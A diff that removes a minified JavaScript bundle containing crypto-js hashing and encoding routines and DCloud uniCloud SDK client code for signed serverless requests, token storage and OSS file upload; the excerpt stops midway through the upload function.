-                clamp: function () {
-                  var t = this.words,
-                    n = this.sigBytes;
-                  t[n >>> 2] &= 4294967295 << 32 - n % 4 * 8, t.length = e.ceil(n / 4);
-                },
-                clone: function () {
-                  var e = o.clone.call(this);
-                  return e.words = this.words.slice(0), e;
-                },
-                random: function (t) {
-                  for (var n, r = [], i = function (t) {
-                      var n = 987654321,
-                        r = 4294967295;
-                      return function () {
-                        var i = ((n = 36969 * (65535 & n) + (n >> 16) & r) << 16) + (t = 18000 * (65535 & t) + (t >> 16) & r) & r;
-                        return i /= 4294967296, (i += 0.5) * (e.random() > 0.5 ? 1 : -1);
-                      };
-                    }, o = 0; o < t; o += 4) {
-                    var s = i(4294967296 * (n || e.random()));
-                    n = 987654071 * s(), r.push(4294967296 * s() | 0);
-                  }
-                  return new a.init(r, t);
-                }
-              }),
-              s = r.enc = {},
-              u = s.Hex = {
-                stringify: function (e) {
-                  for (var t = e.words, n = e.sigBytes, r = [], i = 0; i < n; i++) {
-                    var o = t[i >>> 2] >>> 24 - i % 4 * 8 & 255;
-                    r.push((o >>> 4).toString(16)), r.push((15 & o).toString(16));
-                  }
-                  return r.join("");
-                },
-                parse: function (e) {
-                  for (var t = e.length, n = [], r = 0; r < t; r += 2) n[r >>> 3] |= parseInt(e.substr(r, 2), 16) << 24 - r % 8 * 4;
-                  return new a.init(n, t / 2);
-                }
-              },
-              c = s.Latin1 = {
-                stringify: function (e) {
-                  for (var t = e.words, n = e.sigBytes, r = [], i = 0; i < n; i++) {
-                    var o = t[i >>> 2] >>> 24 - i % 4 * 8 & 255;
-                    r.push(String.fromCharCode(o));
-                  }
-                  return r.join("");
-                },
-                parse: function (e) {
-                  for (var t = e.length, n = [], r = 0; r < t; r++) n[r >>> 2] |= (255 & e.charCodeAt(r)) << 24 - r % 4 * 8;
-                  return new a.init(n, t);
-                }
-              },
-              l = s.Utf8 = {
-                stringify: function (e) {
-                  try {
-                    return decodeURIComponent(escape(c.stringify(e)));
-                  } catch (e) {
-                    throw new Error("Malformed UTF-8 data");
-                  }
-                },
-                parse: function (e) {
-                  return c.parse(unescape(encodeURIComponent(e)));
-                }
-              },
-              f = i.BufferedBlockAlgorithm = o.extend({
-                reset: function () {
-                  this._data = new a.init(), this._nDataBytes = 0;
-                },
-                _append: function (e) {
-                  "string" == typeof e && (e = l.parse(e)), this._data.concat(e), this._nDataBytes += e.sigBytes;
-                },
-                _process: function (t) {
-                  var n = this._data,
-                    r = n.words,
-                    i = n.sigBytes,
-                    o = this.blockSize,
-                    s = i / (4 * o),
-                    u = (s = t ? e.ceil(s) : e.max((0 | s) - this._minBufferSize, 0)) * o,
-                    c = e.min(4 * u, i);
-                  if (u) {
-                    for (var l = 0; l < u; l += o) this._doProcessBlock(r, l);
-                    var f = r.splice(0, u);
-                    n.sigBytes -= c;
-                  }
-                  return new a.init(f, c);
-                },
-                clone: function () {
-                  var e = o.clone.call(this);
-                  return e._data = this._data.clone(), e;
-                },
-                _minBufferSize: 0
-              });
-            i.Hasher = f.extend({
-              cfg: o.extend(),
-              init: function (e) {
-                this.cfg = this.cfg.extend(e), this.reset();
-              },
-              reset: function () {
-                f.reset.call(this), this._doReset();
-              },
-              update: function (e) {
-                return this._append(e), this._process(), this;
-              },
-              finalize: function (e) {
-                return e && this._append(e), this._doFinalize();
-              },
-              blockSize: 16,
-              _createHelper: function (e) {
-                return function (t, n) {
-                  return new e.init(n).finalize(t);
-                };
-              },
-              _createHmacHelper: function (e) {
-                return function (t, n) {
-                  return new d.HMAC.init(e, n).finalize(t);
-                };
-              }
-            });
-            var d = r.algo = {};
-            return r;
-          }(Math), n);
-        }),
-        T = O,
-        P = (S(function (e, t) {
-          var n;
-          e.exports = (n = T, function (e) {
-            var t = n,
-              r = t.lib,
-              i = r.WordArray,
-              o = r.Hasher,
-              a = t.algo,
-              s = [];
-            !function () {
-              for (var t = 0; t < 64; t++) s[t] = 4294967296 * e.abs(e.sin(t + 1)) | 0;
-            }();
-            var u = a.MD5 = o.extend({
-              _doReset: function () {
-                this._hash = new i.init([1732584193, 4023233417, 2562383102, 271733878]);
-              },
-              _doProcessBlock: function (e, t) {
-                for (var n = 0; n < 16; n++) {
-                  var r = t + n,
-                    i = e[r];
-                  e[r] = 16711935 & (i << 8 | i >>> 24) | 4278255360 & (i << 24 | i >>> 8);
-                }
-                var o = this._hash.words,
-                  a = e[t + 0],
-                  u = e[t + 1],
-                  h = e[t + 2],
-                  p = e[t + 3],
-                  g = e[t + 4],
-                  v = e[t + 5],
-                  m = e[t + 6],
-                  _ = e[t + 7],
-                  y = e[t + 8],
-                  w = e[t + 9],
-                  b = e[t + 10],
-                  x = e[t + 11],
-                  k = e[t + 12],
-                  S = e[t + 13],
-                  O = e[t + 14],
-                  T = e[t + 15],
-                  P = o[0],
-                  A = o[1],
-                  I = o[2],
-                  C = o[3];
-                P = c(P, A, I, C, a, 7, s[0]), C = c(C, P, A, I, u, 12, s[1]), I = c(I, C, P, A, h, 17, s[2]), A = c(A, I, C, P, p, 22, s[3]), P = c(P, A, I, C, g, 7, s[4]), C = c(C, P, A, I, v, 12, s[5]), I = c(I, C, P, A, m, 17, s[6]), A = c(A, I, C, P, _, 22, s[7]), P = c(P, A, I, C, y, 7, s[8]), C = c(C, P, A, I, w, 12, s[9]), I = c(I, C, P, A, b, 17, s[10]), A = c(A, I, C, P, x, 22, s[11]), P = c(P, A, I, C, k, 7, s[12]), C = c(C, P, A, I, S, 12, s[13]), I = c(I, C, P, A, O, 17, s[14]), P = l(P, A = c(A, I, C, P, T, 22, s[15]), I, C, u, 5, s[16]), C = l(C, P, A, I, m, 9, s[17]), I = l(I, C, P, A, x, 14, s[18]), A = l(A, I, C, P, a, 20, s[19]), P = l(P, A, I, C, v, 5, s[20]), C = l(C, P, A, I, b, 9, s[21]), I = l(I, C, P, A, T, 14, s[22]), A = l(A, I, C, P, g, 20, s[23]), P = l(P, A, I, C, w, 5, s[24]), C = l(C, P, A, I, O, 9, s[25]), I = l(I, C, P, A, p, 14, s[26]), A = l(A, I, C, P, y, 20, s[27]), P = l(P, A, I, C, S, 5, s[28]), C = l(C, P, A, I, h, 9, s[29]), I = l(I, C, P, A, _, 14, s[30]), P = f(P, A = l(A, I, C, P, k, 20, s[31]), I, C, v, 4, s[32]), C = f(C, P, A, I, y, 11, s[33]), I = f(I, C, P, A, x, 16, s[34]), A = f(A, I, C, P, O, 23, s[35]), P = f(P, A, I, C, u, 4, s[36]), C = f(C, P, A, I, g, 11, s[37]), I = f(I, C, P, A, _, 16, s[38]), A = f(A, I, C, P, b, 23, s[39]), P = f(P, A, I, C, S, 4, s[40]), C = f(C, P, A, I, a, 11, s[41]), I = f(I, C, P, A, p, 16, s[42]), A = f(A, I, C, P, m, 23, s[43]), P = f(P, A, I, C, w, 4, s[44]), C = f(C, P, A, I, k, 11, s[45]), I = f(I, C, P, A, T, 16, s[46]), P = d(P, A = f(A, I, C, P, h, 23, s[47]), I, C, a, 6, s[48]), C = d(C, P, A, I, _, 10, s[49]), I = d(I, C, P, A, O, 15, s[50]), A = d(A, I, C, P, v, 21, s[51]), P = d(P, A, I, C, k, 6, s[52]), C = d(C, P, A, I, p, 10, s[53]), I = d(I, C, P, A, b, 15, s[54]), A = d(A, I, C, P, u, 21, s[55]), P = d(P, A, I, C, y, 6, s[56]), C = d(C, P, A, I, T, 10, s[57]), I = d(I, C, P, A, m, 15, s[58]), A = d(A, I, C, P, S, 21, s[59]), P = d(P, A, I, C, g, 6, s[60]), C = d(C, P, A, I, x, 10, s[61]), I = d(I, C, P, A, h, 15, s[62]), A = d(A, I, C, P, w, 21, s[63]), o[0] = o[0] + P | 0, o[1] = o[1] + A | 0, o[2] = o[2] + I | 0, o[3] = o[3] + C | 0;
-              },
-              _doFinalize: function () {
-                var t = this._data,
-                  n = t.words,
-                  r = 8 * this._nDataBytes,
-                  i = 8 * t.sigBytes;
-                n[i >>> 5] |= 128 << 24 - i % 32;
-                var o = e.floor(r / 4294967296),
-                  a = r;
-                n[15 + (i + 64 >>> 9 << 4)] = 16711935 & (o << 8 | o >>> 24) | 4278255360 & (o << 24 | o >>> 8), n[14 + (i + 64 >>> 9 << 4)] = 16711935 & (a << 8 | a >>> 24) | 4278255360 & (a << 24 | a >>> 8), t.sigBytes = 4 * (n.length + 1), this._process();
-                for (var s = this._hash, u = s.words, c = 0; c < 4; c++) {
-                  var l = u[c];
-                  u[c] = 16711935 & (l << 8 | l >>> 24) | 4278255360 & (l << 24 | l >>> 8);
-                }
-                return s;
-              },
-              clone: function () {
-                var e = o.clone.call(this);
-                return e._hash = this._hash.clone(), e;
-              }
-            });
-            function c(e, t, n, r, i, o, a) {
-              var s = e + (t & n | ~t & r) + i + a;
-              return (s << o | s >>> 32 - o) + t;
-            }
-            function l(e, t, n, r, i, o, a) {
-              var s = e + (t & r | n & ~r) + i + a;
-              return (s << o | s >>> 32 - o) + t;
-            }
-            function f(e, t, n, r, i, o, a) {
-              var s = e + (t ^ n ^ r) + i + a;
-              return (s << o | s >>> 32 - o) + t;
-            }
-            function d(e, t, n, r, i, o, a) {
-              var s = e + (n ^ (t | ~r)) + i + a;
-              return (s << o | s >>> 32 - o) + t;
-            }
-            t.MD5 = o._createHelper(u), t.HmacMD5 = o._createHmacHelper(u);
-          }(Math), n.MD5);
-        }), S(function (e, t) {
-          var n;
-          e.exports = (n = T, void function () {
-            var e = n,
-              t = e.lib.Base,
-              r = e.enc.Utf8;
-            e.algo.HMAC = t.extend({
-              init: function (e, t) {
-                e = this._hasher = new e.init(), "string" == typeof t && (t = r.parse(t));
-                var n = e.blockSize,
-                  i = 4 * n;
-                t.sigBytes > i && (t = e.finalize(t)), t.clamp();
-                for (var o = this._oKey = t.clone(), a = this._iKey = t.clone(), s = o.words, u = a.words, c = 0; c < n; c++) s[c] ^= 1549556828, u[c] ^= 909522486;
-                o.sigBytes = a.sigBytes = i, this.reset();
-              },
-              reset: function () {
-                var e = this._hasher;
-                e.reset(), e.update(this._iKey);
-              },
-              update: function (e) {
-                return this._hasher.update(e), this;
-              },
-              finalize: function (e) {
-                var t = this._hasher,
-                  n = t.finalize(e);
-                return t.reset(), t.finalize(this._oKey.clone().concat(n));
-              }
-            });
-          }());
-        }), S(function (e, t) {
-          e.exports = T.HmacMD5;
-        })),
-        A = S(function (e, t) {
-          e.exports = T.enc.Utf8;
-        }),
-        I = S(function (e, t) {
-          var n;
-          e.exports = (n = T, function () {
-            var e = n,
-              t = e.lib.WordArray;
-            function r(e, n, r) {
-              for (var i = [], o = 0, a = 0; a < n; a++) if (a % 4) {
-                var s = r[e.charCodeAt(a - 1)] << a % 4 * 2,
-                  u = r[e.charCodeAt(a)] >>> 6 - a % 4 * 2;
-                i[o >>> 2] |= (s | u) << 24 - o % 4 * 8, o++;
-              }
-              return t.create(i, o);
-            }
-            e.enc.Base64 = {
-              stringify: function (e) {
-                var t = e.words,
-                  n = e.sigBytes,
-                  r = this._map;
-                e.clamp();
-                for (var i = [], o = 0; o < n; o += 3) for (var a = (t[o >>> 2] >>> 24 - o % 4 * 8 & 255) << 16 | (t[o + 1 >>> 2] >>> 24 - (o + 1) % 4 * 8 & 255) << 8 | t[o + 2 >>> 2] >>> 24 - (o + 2) % 4 * 8 & 255, s = 0; s < 4 && o + 0.75 * s < n; s++) i.push(r.charAt(a >>> 6 * (3 - s) & 63));
-                var u = r.charAt(64);
-                if (u) for (; i.length % 4;) i.push(u);
-                return i.join("");
-              },
-              parse: function (e) {
-                var t = e.length,
-                  n = this._map,
-                  i = this._reverseMap;
-                if (!i) {
-                  i = this._reverseMap = [];
-                  for (var o = 0; o < n.length; o++) i[n.charCodeAt(o)] = o;
-                }
-                var a = n.charAt(64);
-                if (a) {
-                  var s = e.indexOf(a);
-                  -1 !== s && (t = s);
-                }
-                return r(e, t, i);
-              },
-              _map: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
-            };
-          }(), n.enc.Base64);
-        }),
-        C = "uni_id_token",
-        E = "uni_id_token_expired",
-        L = {
-          DEFAULT: "FUNCTION",
-          FUNCTION: "FUNCTION",
-          OBJECT: "OBJECT",
-          CLIENT_DB: "CLIENT_DB"
-        },
-        M = "pending",
-        D = "fulfilled",
-        j = "rejected";
-      function N(e) {
-        return Object.prototype.toString.call(e).slice(8, -1).toLowerCase();
-      }
-      function R(e) {
-        return "object" === N(e);
-      }
-      function $(e) {
-        return "function" == typeof e;
-      }
-      function F(e) {
-        return function () {
-          try {
-            return e.apply(e, arguments);
-          } catch (e) {
-            console.error(e);
-          }
-        };
-      }
-      var U = "REJECTED",
-        B = "NOT_PENDING",
-        q = function () {
-          function e() {
-            var t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-              n = t.createPromise,
-              r = t.retryRule,
-              i = void 0 === r ? U : r;
-            (0, v.default)(this, e), this.createPromise = n, this.status = null, this.promise = null, this.retryRule = i;
-          }
-          return (0, m.default)(e, [{
-            key: "needRetry",
-            get: function () {
-              if (!this.status) return !0;
-              switch (this.retryRule) {
-                case U:
-                  return this.status === j;
-                case B:
-                  return this.status !== M;
-              }
-            }
-          }, {
-            key: "exec",
-            value: function () {
-              var e = this;
-              return this.needRetry ? (this.status = M, this.promise = this.createPromise().then(function (t) {
-                return e.status = D, Promise.resolve(t);
-              }, function (t) {
-                return e.status = j, Promise.reject(t);
-              }), this.promise) : this.promise;
-            }
-          }]), e;
-        }(),
-        z = function () {
-          function e() {
-            (0, v.default)(this, e), this._callback = {};
-          }
-          return (0, m.default)(e, [{
-            key: "addListener",
-            value: function (e, t) {
-              this._callback[e] || (this._callback[e] = []), this._callback[e].push(t);
-            }
-          }, {
-            key: "on",
-            value: function (e, t) {
-              return this.addListener(e, t);
-            }
-          }, {
-            key: "removeListener",
-            value: function (e, t) {
-              if (!t) throw new Error("The \"listener\" argument must be of type function. Received undefined");
-              var n = this._callback[e];
-              if (n) {
-                var r = function (e, t) {
-                  for (var n = e.length - 1; n >= 0; n--) if (e[n] === t) return n;
-                  return -1;
-                }(n, t);
-                n.splice(r, 1);
-              }
-            }
-          }, {
-            key: "off",
-            value: function (e, t) {
-              return this.removeListener(e, t);
-            }
-          }, {
-            key: "removeAllListener",
-            value: function (e) {
-              delete this._callback[e];
-            }
-          }, {
-            key: "emit",
-            value: function (e) {
-              for (var t = this._callback[e], n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
-              if (t) for (var o = 0; o < t.length; o++) t[o].apply(t, r);
-            }
-          }]), e;
-        }();
-      function H(e) {
-        return e && "string" == typeof e ? JSON.parse(e) : e;
-      }
-      var Y = H([]),
-        J = "app",
-        V = (H(void 0), H([]) || []);
-      try {
-        (n("1835").default || n("1835")).appid;
-      } catch (Or) {}
-      var Z,
-        W = {};
-      function K(e) {
-        var t,
-          n,
-          r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
-        return t = W, n = e, Object.prototype.hasOwnProperty.call(t, n) || (W[e] = r), W[e];
-      }
-      "app" === J && (W = uni._globalUniCloudObj ? uni._globalUniCloudObj : uni._globalUniCloudObj = {});
-      var G = ["invoke", "success", "fail", "complete"],
-        Q = K("_globalUniCloudInterceptor");
-      function X(e, t) {
-        Q[e] || (Q[e] = {}), R(t) && Object.keys(t).forEach(function (n) {
-          G.indexOf(n) > -1 && function (e, t, n) {
-            var r = Q[e][t];
-            r || (r = Q[e][t] = []), -1 === r.indexOf(n) && $(n) && r.push(n);
-          }(e, n, t[n]);
-        });
-      }
-      function ee(e, t) {
-        Q[e] || (Q[e] = {}), R(t) ? Object.keys(t).forEach(function (n) {
-          G.indexOf(n) > -1 && function (e, t, n) {
-            var r = Q[e][t];
-            if (r) {
-              var i = r.indexOf(n);
-              i > -1 && r.splice(i, 1);
-            }
-          }(e, n, t[n]);
-        }) : delete Q[e];
-      }
-      function te(e, t) {
-        return e && 0 !== e.length ? e.reduce(function (e, n) {
-          return e.then(function () {
-            return n(t);
-          });
-        }, Promise.resolve()) : Promise.resolve();
-      }
-      function ne(e, t) {
-        return Q[e] && Q[e][t] || [];
-      }
-      function re(e) {
-        X("callObject", e);
-      }
-      var ie = K("_globalUniCloudListener"),
-        oe = {
-          RESPONSE: "response",
-          NEED_LOGIN: "needLogin",
-          REFRESH_TOKEN: "refreshToken"
-        },
-        ae = {
-          CLIENT_DB: "clientdb",
-          CLOUD_FUNCTION: "cloudfunction",
-          CLOUD_OBJECT: "cloudobject"
-        };
-      function se(e) {
-        return ie[e] || (ie[e] = []), ie[e];
-      }
-      function ue(e, t) {
-        var n = se(e);
-        n.includes(t) || n.push(t);
-      }
-      function ce(e, t) {
-        var n = se(e),
-          r = n.indexOf(t);
-        -1 !== r && n.splice(r, 1);
-      }
-      function le(e, t) {
-        for (var n = se(e), r = 0; r < n.length; r++) (0, n[r])(t);
-      }
-      var fe,
-        de = !1;
-      function he() {
-        return fe || (fe = new Promise(function (e) {
-          de && e(), function t() {
-            if ("function" == typeof getCurrentPages) {
-              var n = getCurrentPages();
-              n && n[0] && (de = !0, e());
-            }
-            de || setTimeout(function () {
-              t();
-            }, 30);
-          }();
-        }), fe);
-      }
-      function pe(e) {
-        var t = {};
-        for (var n in e) {
-          var r = e[n];
-          $(r) && (t[n] = F(r));
-        }
-        return t;
-      }
-      var ge = function (e) {
-        (0, d.default)(n, e);
-        var t = k(n);
-        function n(e) {
-          var r;
-          (0, v.default)(this, n);
-          var i = e.message || e.errMsg || "unknown system error";
-          return r = t.call(this, i), r.errMsg = i, r.code = r.errCode = e.code || e.errCode || "SYSTEM_ERROR", r.errSubject = r.subject = e.subject || e.errSubject, r.cause = e.cause, r.requestId = e.requestId, r;
-        }
-        return (0, m.default)(n, [{
-          key: "toJson",
-          value: function () {
-            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
-            if (!(e >= 10)) return e++, {
-              errCode: this.errCode,
-              errMsg: this.errMsg,
-              errSubject: this.errSubject,
-              cause: this.cause && this.cause.toJson ? this.cause.toJson(e) : this.cause
-            };
-          }
-        }]), n;
-      }((0, g.default)(Error));
-      t.UniCloudError = ge;
-      var ve,
-        me,
-        _e = {
-          request: function (e) {
-            return uni.request(e);
-          },
-          uploadFile: function (e) {
-            return uni.uploadFile(e);
-          },
-          setStorageSync: function (e, t) {
-            return uni.setStorageSync(e, t);
-          },
-          getStorageSync: function (e) {
-            return uni.getStorageSync(e);
-          },
-          removeStorageSync: function (e) {
-            return uni.removeStorageSync(e);
-          },
-          clearStorageSync: function () {
-            return uni.clearStorageSync();
-          },
-          connectSocket: function (e) {
-            return uni.connectSocket(e);
-          }
-        };
-      function ye() {
-        return {
-          token: _e.getStorageSync(C) || _e.getStorageSync("uniIdToken"),
-          tokenExpired: _e.getStorageSync(E)
-        };
-      }
-      function we() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-          t = e.token,
-          n = e.tokenExpired;
-        t && _e.setStorageSync(C, t), n && _e.setStorageSync(E, n);
-      }
-      function be() {
-        return ve || (ve = "mp-weixin" === J && r.canIUse("getAppBaseInfo") && r.canIUse("getDeviceInfo") ? x(x({}, uni.getAppBaseInfo()), uni.getDeviceInfo()) : uni.getSystemInfoSync()), ve;
-      }
-      var xe = {};
-      function ke() {
-        var e = uni.getLocale && uni.getLocale() || "en";
-        if (me) return x(x(x({}, xe), me), {}, {
-          locale: e,
-          LOCALE: e
-        });
-        var t = be(),
-          n = t.deviceId,
-          r = t.osName,
-          i = t.uniPlatform,
-          o = t.appId,
-          a = ["appId", "appLanguage", "appName", "appVersion", "appVersionCode", "appWgtVersion", "browserName", "browserVersion", "deviceBrand", "deviceId", "deviceModel", "deviceType", "osName", "osVersion", "romName", "romVersion", "ua", "hostName", "hostVersion", "uniPlatform", "uniRuntimeVersion", "uniRuntimeVersionCode", "uniCompilerVersion", "uniCompilerVersionCode"];
-        for (var s in t) Object.hasOwnProperty.call(t, s) && -1 === a.indexOf(s) && delete t[s];
-        return me = x(x({
-          PLATFORM: i,
-          OS: r,
-          APPID: o,
-          DEVICEID: n
-        }, function () {
-          var e, t;
-          try {
-            if (uni.getLaunchOptionsSync) {
-              if (uni.getLaunchOptionsSync.toString().indexOf("not yet implemented") > -1) return;
-              var n = uni.getLaunchOptionsSync(),
-                r = n.scene,
-                i = n.channel;
-              e = i, t = r;
-            }
-          } catch (e) {}
-          return {
-            channel: e,
-            scene: t
-          };
-        }()), t), x(x(x({}, xe), me), {}, {
-          locale: e,
-          LOCALE: e
-        });
-      }
-      var Se,
-        Oe = {
-          sign: function (e, t) {
-            var n = "";
-            return Object.keys(e).sort().forEach(function (t) {
-              e[t] && (n = n + "&" + t + "=" + e[t]);
-            }), n = n.slice(1), P(n, t).toString();
-          },
-          wrappedRequest: function (e, t) {
-            return new Promise(function (n, r) {
-              t(Object.assign(e, {
-                complete: function (e) {
-                  e || (e = {});
-                  var t = e.data && e.data.header && e.data.header["x-serverless-request-id"] || e.header && e.header["request-id"];
-                  if (!e.statusCode || e.statusCode >= 400) {
-                    var i = e.data && e.data.error && e.data.error.code || "SYS_ERR",
-                      o = e.data && e.data.error && e.data.error.message || e.errMsg || "request:fail";
-                    return r(new ge({
-                      code: i,
-                      message: o,
-                      requestId: t
-                    }));
-                  }
-                  var a = e.data;
-                  if (a.error) return r(new ge({
-                    code: a.error.code,
-                    message: a.error.message,
-                    requestId: t
-                  }));
-                  a.result = a.data, a.requestId = t, delete a.data, n(a);
-                }
-              }));
-            });
-          },
-          toBase64: function (e) {
-            return I.stringify(A.parse(e));
-          }
-        },
-        Te = function () {
-          function e(t) {
-            var n = this;
-            (0, v.default)(this, e), ["spaceId", "clientSecret"].forEach(function (e) {
-              if (!Object.prototype.hasOwnProperty.call(t, e)) throw new Error("".concat(e, " required"));
-            }), this.config = Object.assign({}, {
-              endpoint: 0 === t.spaceId.indexOf("mp-") ? "https://api.next.bspapp.com" : "https://api.bspapp.com"
-            }, t), this.config.provider = "aliyun", this.config.requestUrl = this.config.endpoint + "/client", this.config.envType = this.config.envType || "public", this.config.accessTokenKey = "access_token_" + this.config.spaceId, this.adapter = _e, this._getAccessTokenPromiseHub = new q({
-              createPromise: function () {
-                return n.requestAuth(n.setupRequest({
-                  method: "serverless.auth.user.anonymousAuthorize",
-                  params: "{}"
-                }, "auth")).then(function (e) {
-                  if (!e.result || !e.result.accessToken) throw new ge({
-                    code: "AUTH_FAILED",
-                    message: "\u83B7\u53D6accessToken\u5931\u8D25"
-                  });
-                  n.setAccessToken(e.result.accessToken);
-                });
-              },
-              retryRule: B
-            });
-          }
-          return (0, m.default)(e, [{
-            key: "hasAccessToken",
-            get: function () {
-              return !!this.accessToken;
-            }
-          }, {
-            key: "setAccessToken",
-            value: function (e) {
-              this.accessToken = e;
-            }
-          }, {
-            key: "requestWrapped",
-            value: function (e) {
-              return Oe.wrappedRequest(e, this.adapter.request);
-            }
-          }, {
-            key: "requestAuth",
-            value: function (e) {
-              return this.requestWrapped(e);
-            }
-          }, {
-            key: "request",
-            value: function (e, t) {
-              var n = this;
-              return Promise.resolve().then(function () {
-                return n.hasAccessToken ? t ? n.requestWrapped(e) : n.requestWrapped(e).catch(function (t) {
-                  return new Promise(function (e, n) {
-                    !t || "GATEWAY_INVALID_TOKEN" !== t.code && "InvalidParameter.InvalidToken" !== t.code ? n(t) : e();
-                  }).then(function () {
-                    return n.getAccessToken();
-                  }).then(function () {
-                    var t = n.rebuildRequest(e);
-                    return n.request(t, !0);
-                  });
-                }) : n.getAccessToken().then(function () {
-                  var t = n.rebuildRequest(e);
-                  return n.request(t, !0);
-                });
-              });
-            }
-          }, {
-            key: "rebuildRequest",
-            value: function (e) {
-              var t = Object.assign({}, e);
-              return t.data.token = this.accessToken, t.header["x-basement-token"] = this.accessToken, t.header["x-serverless-sign"] = Oe.sign(t.data, this.config.clientSecret), t;
-            }
-          }, {
-            key: "setupRequest",
-            value: function (e, t) {
-              var n = Object.assign({}, e, {
-                  spaceId: this.config.spaceId,
-                  timestamp: Date.now()
-                }),
-                r = {
-                  "Content-Type": "application/json"
-                };
-              return "auth" !== t && (n.token = this.accessToken, r["x-basement-token"] = this.accessToken), r["x-serverless-sign"] = Oe.sign(n, this.config.clientSecret), {
-                url: this.config.requestUrl,
-                method: "POST",
-                data: n,
-                dataType: "json",
-                header: r
-              };
-            }
-          }, {
-            key: "getAccessToken",
-            value: function () {
-              return this._getAccessTokenPromiseHub.exec();
-            }
-          }, {
-            key: "authorize",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.next = 2, this.getAccessToken();
-                    case 2:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "callFunction",
-            value: function (e) {
-              var t = {
-                method: "serverless.function.runtime.invoke",
-                params: JSON.stringify({
-                  functionTarget: e.name,
-                  functionArgs: e.data || {}
-                })
-              };
-              return this.request(x(x({}, this.setupRequest(t)), {}, {
-                timeout: e.timeout
-              }));
-            }
-          }, {
-            key: "getOSSUploadOptionsFromPath",
-            value: function (e) {
-              var t = {
-                method: "serverless.file.resource.generateProximalSign",
-                params: JSON.stringify(e)
-              };
-              return this.request(this.setupRequest(t));
-            }
-          }, {
-            key: "uploadFileToOSS",
-            value: function (e) {
-              var t = this,
-                n = e.url,
-                r = e.formData,
-                i = e.name,
-                o = e.filePath,
-                a = e.fileType,
-                s = e.onUploadProgress;
-              return new Promise(function (e, u) {
-                var c = t.adapter.uploadFile({
-                  url: n,
-                  formData: r,
-                  name: i,
-                  filePath: o,
-                  fileType: a,
-                  header: {
-                    "X-OSS-server-side-encrpytion": "AES256"
-                  },
-                  success: function (t) {
-                    t && t.statusCode < 400 ? e(t) : u(new ge({
-                      code: "UPLOAD_FAILED",
-                      message: "\u6587\u4EF6\u4E0A\u4F20\u5931\u8D25"
-                    }));
-                  },
-                  fail: function (e) {
-                    u(new ge({
-                      code: e.code || "UPLOAD_FAILED",
-                      message: e.message || e.errMsg || "\u6587\u4EF6\u4E0A\u4F20\u5931\u8D25"
-                    }));
-                  }
-                });
-                "function" == typeof s && c && "function" == typeof c.onProgressUpdate && c.onProgressUpdate(function (e) {
-                  s({
-                    loaded: e.totalBytesSent,
-                    total: e.totalBytesExpectedToSend
-                  });
-                });
-              });
-            }
-          }, {
-            key: "reportOSSUpload",
-            value: function (e) {
-              var t = {
-                method: "serverless.file.resource.report",
-                params: JSON.stringify(e)
-              };
-              return this.request(this.setupRequest(t));
-            }
-          }, {
-            key: "uploadFile",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n, r, i, a, s, u, c, l, f, d, h, p, g, v, m, _, y, w, b, x, k, S;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (n = t.filePath, r = t.cloudPath, i = t.fileType, a = void 0 === i ? "image" : i, s = t.cloudPathAsRealPath, u = void 0 !== s && s, c = t.onUploadProgress, l = t.config, "string" === N(r)) {
-                        e.next = 3;
-                        break;
-                      }
-                      throw new ge({
-                        code: "INVALID_PARAM",
-                        message: "cloudPath\u5FC5\u987B\u4E3A\u5B57\u7B26\u4E32\u7C7B\u578B"
-                      });
-                    case 3:
-                      if (r = r.trim()) {
-                        e.next = 5;
-                        break;
-                      }
-                      throw new ge({
-                        code: "INVALID_PARAM",
-                        message: "cloudPath\u4E0D\u53EF\u4E3A\u7A7A"
-                      });
-                    case 5:
-                      if (!/:\/\//.test(r)) {
-                        e.next = 7;
-                        break;
-                      }
-                      throw new ge({
-                        code: "INVALID_PARAM",
-                        message: "cloudPath\u4E0D\u5408\u6CD5"
-                      });
-                    case 7:
-                      if (f = l && l.envType || this.config.envType, !(u && ("/" !== r[0] && (r = "/" + r), r.indexOf("\\") > -1))) {
-                        e.next = 10;
-                        break;
-                      }
-                      throw new ge({
-                        code: "INVALID_PARAM",
-                        message: "\u4F7F\u7528cloudPath\u4F5C\u4E3A\u8DEF\u5F84\u65F6\uFF0CcloudPath\u4E0D\u53EF\u5305\u542B\u201C\\\u201D"
-                      });
-                    case 10:
-                      return e.next = 12, this.getOSSUploadOptionsFromPath({
-                        env: f,
-                        filename: u ? r.split("/").pop() : r,
-                        fileId: u ? r : void 0
-                      });
-                    case 12:
-                      return d = e.sent.result, h = "https://" + d.cdnDomain + "/" + d.ossPath, p = d.securityToken, g = d.accessKeyId, v = d.signature, m = d.host, _ = d.ossPath, y = d.id, w = d.policy, b = d.ossCallbackUrl, x = {
-                        "Cache-Control": "max-age=2592000",
-                        "Content-Disposition": "attachment",
-                        OSSAccessKeyId: g,
-                        Signature: v,
-                        host: m,
-                        id: y,
-                        key: _,
-                        policy: w,
-                        success_action_status: 200
-                      }, p && (x["x-oss-security-token"] = p), b && (k = JSON.stringify({
-                        callbackUrl: b,
-                        callbackBody: JSON.stringify({
-                          fileId: y,
-                          spaceId: this.config.spaceId
-                        }),
-                        callbackBodyType: "application/json"
-                      }), x.callback = Oe.toBase64(k)), S = {
-                        url: "https://" + d.host,
-                        formData: x,
-                        fileName: "file",
-                        name: "file",
-                        filePath: n,
-                        fileType: a
-                      }, e.next = 27, this.uploadFileToOSS(Object.assign({}, S, {
-                        onUploadProgress: c
-                      }));
-                    case 27:
-                      if (!b) {
-                        e.next = 29;
-                        break;
-                      }
-                      return e.abrupt("return", {
-                        success: !0,
-                        filePath: n,
-                        fileID: h
-                      });
-                    case 29:
-                      return e.next = 31, this.reportOSSUpload({
-                        id: y
-                      });
